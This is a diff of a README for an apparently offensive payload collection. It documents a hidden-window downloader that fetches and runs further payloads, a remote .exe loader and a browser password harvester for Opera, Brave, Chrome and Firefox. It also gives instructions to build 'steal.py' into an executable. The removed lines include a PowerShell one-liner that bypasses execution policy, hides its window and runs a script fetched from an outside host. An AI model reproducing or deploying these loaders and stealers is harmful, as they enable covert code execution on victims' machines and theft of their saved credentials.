@@ -64,6 +64,16 @@ if __name__ == "__main__":
 
 </details>
 
+# Payload 1
+Hides visible console window (if available) and downloads and executes `Payload 2`
+
+<details>
+<summary>Details</summary>
+
+The code can be found at [github.com/kaliiiiiiiiii/vercel_utils_server/@main/app/pshid/route.ts](https://github.com/kaliiiiiiiiii/vercel_utils_server/blob/main/app/pshid/route.ts), and usage at [github.com/kaliiiiiiiiii/vercel_utils_server#pshid](https://github.com/kaliiiiiiiiii/vercel_utils_server?tab=readme-ov-file#pshid)
+
+</details>
+
 # Payload 2
 
 ## Rickroll (powershell)
@@ -102,6 +112,20 @@ If for some reason, you can't see your desktop anymore, perform the following st
 3. type `explorer` and press `ENTER`
 4. 
 </details>
+
+## executable loader
+
+downloads and executes a `.exe` file from `Endpoint 3` 
+
+<details>
+<summary>Details</summary>
+
+The code can be found at [github.com/kaliiiiiiiiii/vercel_utils_server/@main/app/exe2ps1/route.ts](https://github.com/kaliiiiiiiiii/vercel_utils_server/blob/main/app/exe2ps1/route.ts), and usage at [github.com/kaliiiiiiiiii/vercel_utils_server#exe2ps1](https://github.com/kaliiiiiiiiii/vercel_utils_server/tree/main?tab=readme-ov-file#exe2ps1)
+
+</details>
+
+
+# Payload 3
 
 ## Password harvester
 Steal all available passwords from Opera, Brave, Chrome and Firefox
@@ -190,35 +214,16 @@ if __name__ == "__main__":
 
 </details>
 
-## Powershell exe loader
-Loads an executable from an url with arguments
 
-<details>
-<summary>Details</summary>
 
-file: [loadexe.ps1](loadexe.ps1)
-
-### usage
-```shell
-powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
-```
-(executes python installer gui from [python.org/ftp/python/3.12.4/python-3.12.4.exe](https://www.python.org/ftp/python/3.12.4/python-3.12.4.exe), uses [kaliiiiiiiiii/vercel_utils_server/exe2ps1](https://github.com/kaliiiiiiiiii/vercel_utils_server/blob/main/app/exe2ps1/route.ts)) \
-or
-```shell
-powershell -ep ByPass -w h ./loadexe.ps1
-```
-</details>
-
-# build
-an example for building `.exe` file (sends all passwords to an email)
+# Build executables
 
 ### Requirements
 ```shell
 pip install --upgrade pyinstaller
 ```
-+ all requirements for the python script to build
+\+ all requirements for the python script to build
 
-### build
 ```shell
 python build.py "steal.py"
 ```
